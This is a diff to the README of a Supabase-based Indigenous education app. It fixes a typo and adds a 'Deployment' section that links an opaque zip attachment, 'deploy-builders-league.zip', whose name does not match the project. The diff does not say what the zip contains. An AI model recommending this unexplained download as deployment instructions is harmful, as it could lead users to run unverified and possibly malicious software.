@@ -31,7 +31,7 @@ The CBH app is a Indigenous education resource platform where users are able to 
 
 # Install and Run
 
-1. You'll first need a Supabase project which can be made [via the Supabase dashboard](https://database.new) or running locally using the follow command:
+1. You'll first need a Supabase project, which can be made [via the Supabase dashboard](https://database.new) or running locally using the follow command:
 
    ```bash
    npx supabase start
@@ -65,6 +65,12 @@ The CBH app is a Indigenous education resource platform where users are able to 
    The starter kit should now be running on [localhost:3002](http://localhost:3002/).
 
 > Check out [the docs for Local Development](https://supabase.com/docs/guides/getting-started/local-development) to also run Supabase locally.
+
+# Deployment
+For a quick and easy deployment that doesn't create much hassle, download the instructions below:
+[deploy-builders-league.zip](https://github.com/user-attachments/files/20823416/deploy-builders-league.zip)
+
+If you are planning to use the instruction, the minimum spec for a VM is 2 cores and 8 GB of RAM ("e2-standard-2" in GCP). We tried using a custom VM with 2 cores and 4GB to reduce cost, but the installation is very unstable.
 
 # Documentation
 
